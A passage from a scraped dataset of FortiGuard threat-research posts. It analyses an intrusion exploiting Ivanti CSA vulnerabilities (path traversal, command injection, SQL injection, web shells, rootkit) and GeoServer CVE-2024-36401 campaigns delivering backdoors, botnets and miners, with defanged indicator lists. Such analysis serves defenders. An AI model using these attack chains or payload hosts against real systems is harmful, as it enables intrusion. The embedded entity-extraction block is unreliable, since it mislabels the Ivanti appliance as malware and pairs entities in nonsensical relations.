requests was sent by the threat actor on September 4, 2024, at 06:53:14 UTC, right before the exploitation of the command injection vulnerability, affecting the resource/gsb/reports.php. The resource/client/index.phpon the PHP web front of the Ivanti CSA appliance can be accessed by unauthenticated users to download the “LANDESK Remote Assistance Client” software package. The following picture shows how the resource/client/index.phplooks when opened in a browser: Upon inspecting the /client/index.php’s code, FGIR discovered that, by clicking the “Install now” button present on it, the user is redirected to a resource called /client/download.php: The resource/client/download.phpredirects the user to the pageOnDemand.phpvia the header function. The resource/client/OnDemand.phpcontains the code to open a local file calledLDSupport.exe, using the php functionpopen. The local fileis served to the user via the phpechocommand. The threat actor sent a malformed URL to the resource/client/index.php,by inserting%3F.phpat the end of the URI, and appended the URL with the location of the php resource to be accessed through path traversal. Using this technique, the threat actor managed to access the resource/gsb/users.php. The appended resource,/gsb/users.php, was assigned to the variable$filenamein the/client/OnDemand.phpcode, which led to the path traversal vulnerability, allowing the threat actor to view the list of users configured in the CSA appliance. FGIR simulated the exploitation of this vulnerability in its lab environment to understand what information could be acquired with it and the figure below shows the resulting output, which includes the list of users configured on the test appliance: The threat actor exploited this vulnerability several times over the course of their intrusion to access other resources as well, with connections originating from various IP addresses. As seen in the screenshot below, which has all times expressed using the timezone UTC-007, the threat actor used the same vulnerability to access the resource/gsb/datetime.phpas well. FGIR states with medium confidence that the threat actor exploited this path traversal vulnerability to gain access to the resource/gsb/users.phpnot only to list users, but also to attempt to create rogue users and gain authenticated access to the CSA web front end. Themessageslogs contain evidence of the threat actor creating two users:aiadminandservices, using the CSA utility calleddbtool. This was likely performed to maintain persistent, authenticated access to the CSA management console. After the threat actor exploited the path traversal vulnerability and enumerated users configured on the CSA appliance, they exploited CVE-2024-8190, the command injection vulnerability affecting the resource /gsb/DateTimeTab.php, to attempt to access the credentials of those users. FGIR observed evidence of this exploitation in Ivanti’s broker logs, as seen in the snippet below. FGIR has high confidence that the threat actor exploited this vulnerability to gain access to the user,admin’s credentials and use these privileged credentials to carry out the authenticated exploitation of the command injection vulnerability in/clients/reports.phpresource. FGIR found the text “rewritten with new timezone” within the functionsetPhpTimeZone($timezoneinfo)of the resourceDateTimeTab.php. From the above systemLog function call, it is clear that the value of the variable, $timezone was the one that was manipulated by the threat actor. Tracing back the value of this variable shows that it was deduced from the parameter$timezoneinfo, which was passed to the functionsetPhpTimeZone. Tracing back where thesetPhpTimeZonewas called, FGIR found that this happened within the functionhandleDateTimeSubmit(&$msg). This function is responsible for handling change submissions when the “Save” button is clicked, as depicted in the screenshot below. The value of a global variable, $TIMEZONE, which was passed as a variable to the functionsetPhpTimeZone, was received from the POST request variableTIMEZONE. This implies that the threat actor crafted and sent a malicious POST request toDateTimeTab.php, with the malicious command passed in the POST request variableTIMEZONE. Going back to the malicious command injected by the threat actor, FGIR decoded the base64 blob, which resulted in the following Python code: The script extracts the password of the usergsbadminfrom the file/opt/landesk/broker/broker.confand assigns its value to the environment variablePGPASSWORD. The code targets the latest backup file in the/backupsdirectory and iterates through this directory to find the latest backup file. If it finds one, then it connects to the Postgres database using thegsbadmincredentials, extracts the password of the useradminfrom the tableuser_info,and assigns it to the environment variablePGPASSWORD. The script then decompresses the latest backup file, and then iterates through the files to search for a filename that satisfies the regular expressionphp\\w{6}, basically looking for a filename containing the stringphpfollowed by six characters (letters or numbers only). In case it finds such a file, it changes the permissions of the file so thateveryonehas the right to read, write, and execute it. The script then reads the private key from the backup file of the userroot, encodes it using base64, and then assigns the resultant value to the columnorganizationin the Postgres database table,user_info. While assessing the backend Postgres database logs, FGIR found confirmation of successful exploitation of this command injection vulnerability, as seen in the screenshot below: Once the threat actor extracted the credentials of the usersgsbadmin, admin, and the private key of the userroot,they used the stolen credentials to perform authenticated exploitation of the publicly unknown command injection vulnerability affecting the resource/gsb/reports.php. Some of the threat actor requests can be seen in the messages and audit logs below: Command injection was found to be exploited in the following format, where a php script/subin/tripwirewas executed with the parameter–update,followed by a semicolon and a malicious command. The first malicious command injected by the threat actor was used to create a web shell calledhelp.phpin the CSA webroot folder under the/gsbdirectory. FGIR looked at the code of the resourcereports.phpand identified the vulnerability in the line highlighted below in yellow. The script accepts the value of the POST parameterTW_IDand passes it as a parameter to the script/subin/tripwire, without sanitization. The resource/sbin/tripwireis a PHP wrapper for the binary/usr/sbin/tripwire, which is used to create security reports, when initiated through the gsb/reports.phpresource. This is a legitimate functionality of the Ivanti CSA portal. FGIR inspected the tripwire PHP wrapper script and found the functionupdatewhich passes the command directly to the installed tripwire binary without sanitization. Since the tripwire PHP wrapper runs withsudoprivileges, the injected command also runs with elevated privileges. FGIR acquired the patch for CVE-2024-8190, and while analyzing the functionality of the patch, FGIR assessed that the file,reports.phpwas not in the patch script, nor was it listed as a file in the patch folder, leading FGIR to conclude that the command injection vulnerability found in the resource/gsb/reports.phpwas not addressed in that patch. On September 10, 2024, when the advisory for CVE-2024-8190 was published by Ivanti, the threat actor, still active in the customer’s network, “patched” the command injection vulnerabilities in the resources/gsb/DateTimeTab.php, and/gsb/reports.php, making them unexploitable. In the past, threat actors have been observed to patch vulnerabilities after having exploited them, and gained foothold into the victim’s network, to stop any other intruder from gaining access to the vulnerable asset(s), and potentially interfering with their attack operations. In this case, the threat actor downloaded the patched version of the two vulnerable resources fromtemp[.]shand saved them as/tmp/1on disk, before moving them to the webroot folder and overwriting the vulnerable version of the files with them. Below are the relevant commands: The modified timestamps of the resourcesreports.php, andDateTimeTab.phpwere September 10, 2024, at 12:37:23 UTC and 13:06:10 UTC, respectively, as seen in the screenshots below. Comparing the original vulnerable version ofreports.phpto the version patched by the threat actor, shows that the threat actor added a piece of code to replace the semicolon with an underscore in the POST parameterTW_ID, so that command injection using the semicolon is not possible anymore. FGIR tested the patching in a lab environment and confirmed that the modification by the threat actor does indeed make the resourcereports.phpunexploitable after the patch. The screenshot below shows the directorytestwithoutfixwas successfully created by exploiting the command injection vulnerability on the original vulnerable version ofreports.php. When the fix is applied to thereports.phpfile and the command injection is exploited again, the directorytestwithfixis not created. The threat actor also patched the fileDateTimeTab.phpusing the samestr_replacefunction to replace any semicolon in the POST parameterTIMEZONE, with an underscore, rendering the command injection vulnerability using this parameter ineffective. After compromising the internet-facing Ivanti CSA appliance, the threat actor exploited the CVE-2024-29824 SQL Injection vulnerability on Ivanti’s backend SQL database server (SQLS). Sample malicious POST requests exploiting this vulnerability are depicted below. The threat actor enabled thexp_cmdshellstored procedure via the exploitation and used this stored procedure to attain remote code execution on the SQLS system. The threat actor created an account calledmssqlsvcon the compromised system SQLS and turned off the host firewall. FGIR also observed that the threat actor ran some basic reconnaissance commands on theSQLSsystem and attempted to exfiltrate the reconnaissance output using the following PowerShell command: This is a technique used to exfiltrate data over the DNS protocol. The technique is also known asDNS tunneling. See below for the content of the file that the threat actor tried to exfiltrate: FGIR discovered more tactics and techniques used by the threat actor during their intrusion. FGIR extracted and decoded some interesting commands executed by the threat actor from the Linux audit logs and other sources. A sample of those commands are shown in the table below: During the course of their operations, the threat actor created several webshells. They also modified the legitimate resource,syslog.php,and appended malicious code to it, to use it as a web shell. Some of the web shells found are shown in the table below. On September 11, at 04:12:00 UTC, the threat actor started an authentication brute force attack against the customer’s internal network assets, using a dictionary attack. FGIR discovered that the threat actor downloaded a tar file calledufrom atemp[.]shURL. This tar file contained three files:brokes, passdic.txt, andu.txt. The filebrokesis a Linux ELF binary, which was used to perform the brute force attack on customer’s network assets. It is likely thatbrokesused as parameters the list of customer’s users, possibly harvested during a different campaign, in the form of the fileu.txtand the password filepassdic.txt. The threat actor downloaded an unknown file calledtargetfromtemp[.]sh, however this one was not found on the disk. The threat actor also downloaded a shell script calleds.sh, from thetemp[.]shsite. This script was used to execute thebruteforcebinarybrokesand anonymous logins were attempted on LDAP’s port TCP 389 of the attacked assets with several passwords. During the memory analysis of the CSA appliance, FGIR discovered traces of the use of an open-source go-based proxy tool calledReverseSocks5, which was downloaded and used by the threat actor to perform scanning and brute force attacks on the customer’s internal network, while proxying the traffic through the CSA appliance. The string, which was created in the memory due to an error thrown by the tool, can be seen in the below snippet. Some other suspicious strings found during the analysis of the memory included some PHP variables found to be populated with suspicious values: ZjmgmXsB.phpwas a webshell, which the threat actor was interacting with, while accessing it from the IP address208[.]105[.]190[.]170. During the investigation, FGIR discovered that on September 7, 2024, at 03:26:17 UTC, the threat actor attempted to deploy a rootkit in the form of a Linux kernel object (KO) module on the CSA appliance. This attempt was found in the audit logs as seen in the snippet below: The likely motive behind this was for the threat actor to maintain kernel-level persistence on the CSA device, which may survive even a factory reset. This activity is in line with the public reporting on the compromise of Ivanti CSA appliances, which is availablehereandhere. FGIR decoded the hex string contained in the snippet above and obtained a base64 encoded blob. The initial part of the resultant base64 encoded blob indicates that this is a compressed archive file. Decompressing the tar file results in the following two files. The fileinstall.shis a malicious bash script that installs a malicious kernel object calledsysinitd.ko. The compressed archive file was corrupted and only the fileinstall.shcould be retrieved successfully in its entirety, while the filesysinitdwas truncated, and the filesysinitd.kowas missing. FGIR pivoted to the disk image of the CSA appliance and found thesysinitdandsysinitd.kofiles in the location/usr/share/empty/init/. The scriptinstall.shwas meant to install the malicious rootkitsysinitd.koon the affected system. The following variables were hard-coded in the scriptinstall.sh: The script starts with the following function call, which reads two parameters: The first parameter is the INSTALL_NAME string, which is used to rename the two files sysinitd andsysinitd.koto INSTALL_NAME and INSTALL_NAME.ko respectively. The second parameter is the path where the script copies the renamed version ofsysinitdandsysinitd.koto. In this case, the threat actor did not supply either of the two parameters. Therefore, the default namessysinitdandsysinitd.kowere used by the script. The following snippet of code checks if the install path exists and if not, then it creates it: The script then removes any installed kernel object with the name INSTALL_NAME.ko, using the commandrmmod, and then installs the malicious INSTALL_NAME.ko using the commandinsmod. The bash scriptinstall.shinstalls a persistence mechanism using the technique of adding an entry to install the malicious kernel object in therc.localandrc.d/rc.localfiles, if the malicious kernel object file is present on disk. FGIR aims to analyze the rootkit in detail and publish the findings in a follow-up blog post. The advanced adversaries were observed exploiting and chaining zero-day vulnerabilities to establish beachhead access in the victim’s network. You can read more about the Ivanti CSA zero-day attack in our Threat Signal Report:https://www.fortiguard.com/threat-signal-report/5556. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BASH/Agent.030E!trELF/Agent.69A0!trELF/Agent.7E02!trELF/Agent.BD!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus service. The FortiGuard antivirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Fortinet has also released the following IPS signatures to protect our customers from the threats contained in the report. CVE-2024-8190;https://www.fortiguard.com/encyclopedia/ips/56651 The interactsh related URLs are rated as “Malicious Websites” and “Malicious Activities Found” by the FortiGuard Web Filtering service. FortiGuard IP Reputation and Anti-Botnet Security Service proactively blocks these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. The MITRE ATT&CK framework has been used to refer to the various tactics and techniques used by the threat actor. Network Indicator Protocol Port Notes apiv5[.]serverbks[.]xyz 443 Domain associated with IP 156[.]234[.]193[.]18 74[.]62[.]81[.]162 57532 Threat actor’s C2 189f31ed7d[.]ipv6[.]bypass[.]eu[.]org Seen in encoded PowerShell used by the threat actor iowxuintgredogzgblrsmr2cx2e471bor.oast[.]fun Seen in encoded PowerShell used by the threat actor o.lencr[.]org Let's Encrypt domain name c67f045c2f.ipv6.1433.eu[.]org Seen in encoded PowerShell used by the threat actor 206[.]189[.]156[.]69 oast[.]fun domain IP 51[.]91[.]79[.]17 temp[.]sh domain IP 156[.]234[.]193[.]18 C2 IP found in the python reverse shell 208[.]105[.]190[.]170 Threat actor IP interacting with webshell http://temp[.]sh/khkzg/DateTimeTab.php HTTP 80 Patched version of DateTimeTab.php downloaded by the threat actor from this URL to overwrite the vulnerable version. http://temp[.]sh/vQuoW/reports.php HTTP 80 Patched version reports.php downloaded by the threat actor from this URL to overwrite the vulnerable version. http://l8u6aolk4ejfsl9zeq6321zvwm2eq3[.]burpcollaborator.net HTTP 80 Accessed by the threat actor 54[.]77[.]139[.]23 oastify[.].com subdomains 34[.]250[.]195[.]30 portswigger[.]net domain IP, web app security & testing 216[.]131[.]75[.]52 Threat actor IP interacting with webshell 24[.]166[.]100[.]255 Threat actor IP interacting with webshell 67[.]217[.]228[.]92 Threat actor IP interacting with webshell 69[.]49[.]88[.]235 Threat actor IP interacting with webshell 45[.]61[.]136[.]189 Threat actor IP interacting with webshell 3[.]248[.]33[.]252 Threat actor IP interacting with webshell 38[.]207[.]159[.]76 Threat actor IP interacting with webshell 193[.]189[.]100[.]197 Threat actor IP interacting with webshell 23[.]236[.]66[.]97 Threat actor IP interacting with webshell PATH FILE NAME SHA1 HASH NOTES \\Device\\HarddiskVolume2\\ProgramData\\1.log 1.log Reconnaissance output \\Device\\HarddiskVolume2\\ProgramData\\bakeup.bat bakeup.bat Unknown batch file \\Device\\HarddiskVolume2\\ProgramData\\output output Reconnaissance output \\Device\\HarddiskVolume2\\ProgramData\\sess010981 sess010981 Reconnaissance output C:\\inetpub\\wwwroot\\aspnet_client\\read.txt read.txt Unknown text file https://10.10.11.31/client/site.php site.php Web shell on CSA appliance c:\\programdata\\output.hex output.hex Encoded reconnaissance output brokes brokes beb723a5f20a1a2c4375f9aa250d968d55155689 Bruteforcer binary passdic.txt passdic.txt List of passwords u.txt u.txt List of harvested usernames /tmp/1 1 Files downloaded on the device are created as /tmp/1 on the CSA disk /tmp/systemd-private-2e4a6ea82da94a9b9fec37fe91c9b820-broker.service-asZTdm/tmp/.br/broke broke 64efc1aad330ea9d98c0c705e16cd4b3af7e74f8 Linux brute force binary /client/site.php site.php Web shell on CSA appliance /gsb/client.php client.php Web shell on CSA appliance /gsb/firewall.php firewall.php Web shell on CSA appliance /gsb/reports.php reports.php Web shell on CSA appliance /gsb/style.php style.php Web shell on CSA appliance /gsb/syslog.php?a=phpinfo(); syslog.php Web shell on CSA appliance /gsb/users.php users.php Web shell on CSA appliance /gsb/uSxhmgm.php uSxhmgm.php Web shell on CSA appliance /gsb/ZjmgmXsB.php ZjmgmXsB.php Web shell on CSA appliance install.sh install.sh 8d016d02f8fbe25dce76481a90dd0b48630ce9e74e8c31ba007cf133e48b8526 Rootkit installation script /usr/share/empty/init/sysinitd.ko sysinitd.ko 6edd7b3123de985846a805931ca8ee5f6f7ed7b160144aa0e066967bc7c0423a Rootkit – Kernel Object Module /usr/share/empty/init/sysinitd sysinitd d57a2cac394a778e19ce9b926f2e0a71936510798f30d20f207f2a49b49ce7b1 Malicious Linux binary zero-day vulnerability FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (Ivanti Cloud Services Appliance, Malware), (CVE-2024-8190, Vulnerability), (PHP, Tool), (IP address, IP), (206[.]189[.]156[.]69, IP)\\nRelationships: (FortiGuard Labs Threat Research, affectedBy, Ivanti Cloud Services Appliance), (Ivanti Cloud Services Appliance, contains, CVE-2024-8190), (Ivanti Cloud Services Appliance, contains, PHP), (206[.]189[.]156[.]69, resolvesTo, IP address), (FortiGuard Labs Threat Research, released, blog post), (blog post, describes, case study), (case study, involves, Ivanti Cloud Services Appliance), (Ivanti Cloud Services Appliance, impactedBy, CVE-2024-8190), (Ivanti Cloud Services Appliance, impactedBy, previously unknown vulnerabilities), (Ivanti Cloud Services Appliance, impactedBy, PHP), (Ivanti Cloud Services Appliance, impactedBy, CVE-2024-8190), (Ivanti Cloud Services Appliance, impactedBy, previously unknown vulnerabilities), (Ivanti Cloud Services Appliance, impactedBy, PHP), (",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity"
        ],
        [
          "Ivanti Cloud Services Appliance",
          "Malware"
        ],
        [
          "CVE-2024-8190",
          "Vulnerability"
        ],
        [
          "PHP",
          "Tool"
        ],
        [
          "IP address",
          "IP"
        ],
        [
          "206[.]189[.]156[.]69",
          "IP"
        ],
        [
          "FortiGuard Labs Threat Research",
          "affectedBy",
          "Ivanti Cloud Services Appliance"
        ],
        [
          "Ivanti Cloud Services Appliance",
          "contains",
          "CVE-2024-8190"
        ],
        [
          "Ivanti Cloud Services Appliance",
          "contains",
          "PHP"
        ],
        [
          "206[.]189[.]156[.]69",
          "resolvesTo",
          "IP address"
        ],
        [
          "FortiGuard Labs Threat Research",
          "released",
          "blog post"
        ],
        [
          "blog post",
          "describes",
          "case study"
        ],
        [
          "case study",
          "involves",
          "Ivanti Cloud Services Appliance"
        ],
        [
          "Ivanti Cloud Services Appliance",
          "impactedBy",
          "CVE-2024-8190"
        ],
        [
          "Ivanti Cloud Services Appliance",
          "impactedBy",
          "previously unknown vulnerabilities"
        ],
        [
          "Ivanti Cloud Services Appliance",
          "impactedBy",
          "PHP"
        ],
        [
          "Ivanti Cloud Services Appliance",
          "impactedBy",
          "CVE-2024-8190"
        ],
        [
          "Ivanti Cloud Services Appliance",
          "impactedBy",
          "previously unknown vulnerabilities"
        ],
        [
          "Ivanti Cloud Services Appliance",
          "impactedBy",
          "PHP"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 19,
    "relationship_count": 0
  },
  {
    "title": "Threat Actors Exploit GeoServer Vulnerability CVE-2024-36401",
    "link": "https://www.fortinet.com/blog/threat-research/threat-actors-exploit-geoserver-vulnerability-cve-2024-36401",
    "content": "FortiGuard Labs Threat Research Affected Platforms:GeoServer prior to versions 2.23.6, 2.24.4, and 2.25.2Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical GeoServer is anopen-source softwareserver written in Java that allows users to share and edit geospatial data. It is the reference implementation of the Open Geospatial Consortium (OGC) Web Feature Service (WFS) and Web Coverage Service (WCS) standards. On July 1, the project maintainers released anadvisoryfor the vulnerabilityCVE-2024-36401(CVSS score: 9.8). Multiple OGC request parameters allow remote code execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions. The shortcoming has beenaddressedin versions 2.23.6, 2.24.4, and 2.25.2. On July 15, the U.S. Cybersecurity and Infrastructure Security Agency (CISA)addeda critical security flaw impacting OSGeo GeoServer GeoTools to its Known Exploited Vulnerabilities (KEV) catalog based on evidence of active exploitation. FortiGuard Labs added theIPS signaturethe next day and has observed multiple campaigns targeting this vulnerability to spread malware. The botnet family and miner groups strike the attack immediately. We also collect sidewalk backdoors, and GOREVERSE tries to exploit this vulnerability and set a connection with a command and control server (C2) to execute malicious actions. In this article, we will explore the details of the payload and malware. The payload retrieves a script from “hxxp://181[.]214[.]58[.]14:61231/remote.sh.” The script file first verifies the victim’s operating system and architecture to download the appropriate file, which it saves as “download_file.” It accommodates various OS types, including Linux, FreeBSD, Illumos, NetBSD, OpenBSD, and Solaris. After execution, it deletes the file to remove traces of its activity. The ultimate executable is “GOREVERSE,\" packed with UPX. GOREVERSE is a malicious tool that often functions as areverse proxy server, allowing attackers to illicitly access target systems or data. Once executed, the connection is made to a specific IP address (181[.]214[.]58[.]14) and port (18201), which is not a standard SSH port. From the exploitation packet of CVE-2024-36401, we observed threat actors attempting to access IT service providers in India, technology companies in the U.S., government entities in Belgium, and telecommunications companies in Thailand and Brazil. The attacker fetches the script from “hxxp://1[.]download765[.]online/d.” This batch file facilitates the download of execution files. All the ELF files on the remote server, known as the “SideWalk” malware, are designed to operate on ARM, MIPS, and X86 architectures. SideWalk is a sophisticated Linux backdoor malware also often linked with the hacking groupAPT41. First, SideWalk creates a folder named with a randomly generated string in the TMP directory. It then decodes two library files, libc.so.0 and ld-uClibc.so.1, along with the next-stage payload using the XOR key 0xCC. These decoded files are then stored in the previously created folder in the TMP path. Then, it also uses XOR to decode the string data using the key 0x89. It then executes the next stage payload, “ych7s5vvbb669ab8a.” It has three main functions: 1. Decrypt configuration: The configuration is decrypted using the ChaCha20 algorithm. The binary input contains a 16-byte MD5 hash, a 12-byte nonce for ChaCha20 decryption, and a 4-byte section indicating the length of the ciphertext, followed by the actual ciphertext. Based on the assembly code, the decryption key is hard-coded as “W9gNRmdFjxwKQosBYhkYbukO2ejZev4m,” and the decryption process runs 15 rounds (0xF). After successful decryption, the extracted C2 is secure[.]systemupdatecdn[.]de (47[.]253[.]46[.]11), listening on port 80, with the mutex name “hfdmzbtu.” 2. Establish C2 communication: Communication with the C2 server is established using an encrypted session, also based on the ChaCha20 algorithm. The packet structure comprises a 4-byte section representing the packet length, a 12-byte nonce for ChaCha20 decryption, 20 bytes of message metadata, and the final ciphertext. The initial exchange includes keys (v-key and s-key) for subsequent message encryption. In early packets, the original key, “W9gNRmdFjxwKQosBYhkYbukO2ejZev4m,” decrypts the message metadata, while the exchanged keys (v-key and s-key) decrypt the ciphertext. In packet 5, the victim’s information (computer name, operating system, and system time) is transmitted. 3. Execute the command issued by C2: In this attack scenario, we find a Plugin namedFast Reverse Proxy(FRP.) Fast Reverse Proxy (FRP) is a legitimate and widely-used tool that complicates the detection of malicious network traffic by blending it with normal traffic, thereby enhancing the stealthiness of cyberattacks. Because it is open source, this tool has been leveraged in the past by several threat actors, such asMagic Hound,Fox Kitten, andVolt Typhoon. Using FRP, attackers create an encrypted tunnel from an internally compromised machine to an external server under their control. This method enables them to maintain a foothold within compromised environments, exfiltrate sensitive data, deploy further malicious payloads, or execute other operations. In this attack case, SideWalk also downloads a customized configuration file that directs the connection to a remote server (47[.]253[.]83[.]86) via port 443, further enhancing the attacker's control and persistence. Analysis of the script download URL's telemetry reveals a concentrated pattern of infections. The primary targets appear to be distributed across three main regions: South America, Europe, and Asia. This geographical spread suggests a sophisticated and far-reaching attack campaign, potentially exploiting vulnerabilities common to these diverse markets or targeting specific industries prevalent in these areas. This script downloads and executes a file named “sky” from a specified URL, “hxxp://188[.]214[.]27[.]50:4782. “ It changes its permissions to make it executable, runs it with the parameter “geo,” and then deletes the file. The configuration data is extracted by XORing the file contents with 0x3A. This enabled us to find information like “bots[.]gxz[.]me,” which is the C2 server the malware attempts to connect to. When executing the malware, a string shows up. This malware has a credential list for brute-force attacks and a hard-coded payload related to the Huawei router vulnerability CVE-2017-17215. The payload attempts to download malware from 59[.]59[.]59[.]59. The attacker first terminates several processes (mpsl, mipsel, bash.mpsl, mips, x86_64, x86), then downloads and executes multiple bot binaries for different CPU architectures (such as ARM, MIPS, PPC, X86, M68K, SH4, and MPSL) from a remote server, “hxxp://209[.]146[.]124[.]181:8030.” The binaries are fetched using wget, saved in the /tmp directory, made executable (chmod 777), and executed. The following section uses “bot.arm7” as an example. The malware can be recognized by the specified string “condi.” Executing the malware sends numerous DNS queries to “trcpay[.]xyz.” The Condi botnet first tries to resolve the C2 server address and its function. It then establishes a connection with the C2 server and waits to parse the command. The malware has numerous DDoS attack methods, such as TCP flooding, UDP flooding, and a VSE DDoS attack. In tracing the connection back to the remote server, “hxxp://209[.]146[.]124[.]181:8030,” we found that it was built as an HFS (HTTP File Server) and that two malicious tools—“Linux2.4” (another botnet) and “taskhost.exe” (the agent tool)—are located in the server. The botnet “Linux2.4” not only has different methods that can trigger a DDoS attack but can also act as a backdoor agent. The tool first connects to a server, which is the same as the remote server “209[.]146[.]124[.]181.” It then gathers the host information. Later, it waits for the command to either conduct a remote command execution or trigger a DDoS attack. The Backdoor malware “taskhost.exe” is designed especially for Windows. It creates a service named “9jzf5” for persistence and then creates different process types to retrieve information from attackers lurking in the host. We found four types of incident coin miners that can be delivered to victim hosts, as shown in the following details. The attacker downloads a script from a remote URL “hxxp://oss[.]17ww[.]vip/21929e87-85ff-4e98-a837-ae0079c9c860[.]txt/test.sh” and saves it as script.sh in the temp folder. The payload within the incident packets then modifies and executes the script to achieve various purposes. The script first gathers host information, such as the location of Aegis, the distribution version of Linux. Afterward, it attempts to uninstall different cloud platforms, like Tencent Cloud, Oracle, Kingsoft Cloud, JD Cloud, and Ali Cloud, to evade monitoring agents from those cloud services. A noteworthy point is that the comments in the script are written in simplified Chinese, indicating that the miner campaign/author may be affiliated with a Chinese group. While finishing these uninstalls, the script kills some security defense mechanisms processes and checks whether the current user has the root privilege needed to uninstall those mechanisms. If everything executes successfully, the script downloads the coin miner and creates another script for persistence. The coin miner, named “sshd,” wrote the configuration within itself. The miner points to two target pools: “sdfasdfsf[.]9527527[.]xyz:3333” and “gsdasdfadfs[.]9527527[.]xyz:3333.” Another type of coin miner attack begins with the Base64-encoded command. It intends to download “linux.sh” from “hxxp://repositorylinux.com.” The comment in “linux.sh” is written in Sundanese, an Indonesian language. The script downloads two files: a coin miner named “linuxsys“ and a related configuration file named “config.json.” It downloads these through an AWS (Amazon Web Service) cloud platform service the attacker holds. The coin miner sets the pool URL “pool[.]supportxmr[.]com:80” with credentials using “config.json.” The miner itself is XMRig, which can be recognized through its data. The action sent via four packets is to download “/tmp/MmkfszDi” from the remote server “hxxp://95[.]85[.]93[.]196:80/asdfakjg.sh,” make it executable, and then run it. The script downloads a coin miner like the others mentioned before. It also removes a list of files within “/tmp,” “/var,” \"/usr,\" and “/opt.” The coin miner named “h4” is similar to the other two types mentioned. It is XMRig as well and embeds its configuration within the binary file. The miner sets the pool URL as “asdfghjk[.]youdontcare[.]com:81” The last type of coin miner incident command is also encoded with base64. It downloads “cron.sh” from “112[.]133[.]194[.]254.” This fraudulent site mimics the webpage of the Institute of Chartered Accountants of India (ICAI). The site is currently removed. “cron.sh” uses the job scheduler on the Unix-like operating system “cron,” as its name indicates. The script schedules jobs for things like downloading coin miner-related scripts and setting the scripts into “crontab.” It first downloads the script named “check.sh” from the same source IP “112[.]133[.]194[.]254” and executes the script. “check.sh” first creates the necessary directories and confirms that the victim host hasn’t been infected. Once the script finds that the victim host is the first to be infected, it downloads “config.sh” from the attacker’s IP “112[.]133[.]194[.]254” and the XMRig coin miner from the developer platform “Github.” Through “config.sh,” we learned that the attacker set the pool on SupportXMR “pool[.]supportxmr[.]com:3333” While GeoServer’s open-source nature offers flexibility and customization, it also necessitates vigilant security practices to address its vulnerabilities. The developer patched the vulnerability with the function “JXPathUtils.newSafeContext” instead of the original vulnerable one to evaluate the XPath expression safety. However, implementing comprehensive cybersecurity measures—such as regularly updating software, employing threat detection tools, and enforcing strict access controls—can significantly mitigate these risks. By proactively addressing these threats, organizations can secure their environments and ensure the protection and reliability of these data infrastructures. The malware described in this report is detected and blocked by FortiGuard Antivirus as: Adware/MinerBASH/Agent.CPC!trBASH/Miner.VZ!trData/Miner.2F82!trData/Miner.3792!trELF/Agent.CPN!trELF/Agent.CPN.TRELF/BitCoinMiner.HF!trELF/Flooder.B!trLinux/CoinMiner.ACZ!trLinux/Mirai.CEA!trLinux/Mirai.CJS!trLinux/Mirai.IZ1H9!trLinux/SideWalk.Q!trRiskware/CoinMinerW32/ServStart.IO!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard Web Filtering Service blocks the C2 servers and downloads URLs. FortiGuard Labs provides IPS signatures against attacks exploiting the following vulnerability: CVE-2024-36401:GeoServer.OGC.Eval.Remote.Code.Execution We also suggest that organizations go through Fortinet’s free training module:Fortinet Certified Fundamentals (FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://181[.]214[.]58[.]14:61231/remote.shhxxp://1[.]download765[.]online/dhxxp://188[.]214[.]27[.]50:4782/skyhxxp://209[.]146[.]124[.]181:8030/bot[.]armhxxp://209[.]146[.]124[.]181:8030/bot[.]arm5hxxp://209[.]146[.]124[.]181:8030/bot[.]arm6hxxp://209[.]146[.]124[.]181:8030/bot[.]arm7hxxp://209[.]146[.]124[.]181:8030/bot[.]m68khxxp://209[.]146[.]124[.]181:8030/bot[.]mipshxxp://209[.]146[.]124[.]181:8030/bot[.]mpslhxxp://209[.]146[.]124[.]181:8030/bot[.]ppchxxp://209[.]146[.]124[.]181:8030/bot[.]sh4hxxp://209[.]146[.]124[.]181:8030/bot[.]x86hxxp://209[.]146[.]124[.]181:8030/bot[.]x86_64hxxp://209[.]146[.]124[.]181:8030/JrLinuxhxxp://209[.]146[.]124[.]181:8030/Linux2[.]4hxxp://209[.]146[.]124[.]181:8030/Linux2[.]6hxxp://209[.]146[.]124[.]181:8030/taskhost[.]exehxxp://oss[.]17ww[.]vip/21929e87-85ff-4e98-a837-ae0079c9c860.txt/test.shhxxp://oss[.]17ww[.]vip/21929e87-85ff-4e98-a837-ae0079c9c860.txt/sshdhxxp://ec2-54-191-168-81[.]us-west-2.compute.amazonaws.com/css/linuxsyshxxp://ec2-54-191-168-81[.]us-west-2.compute.amazonaws.com/css/config.jsonhxxp://ec2-13-250-11-113[.]ap-southeast-1.compute.amazonaws.com/css/linuxsyshxxp://ec2-13-250-11-113[.]ap-southeast-1.compute.amazonaws.com/css/config.jsonhxxp://95[.]85[.]93[.]196:80/h4hxxp://112[.]133[.]194[.]254/cron.shhxxp://112[.]133[.]194[.]254/check.shhxxp://112[.]133[.]194[.]254/config.sh 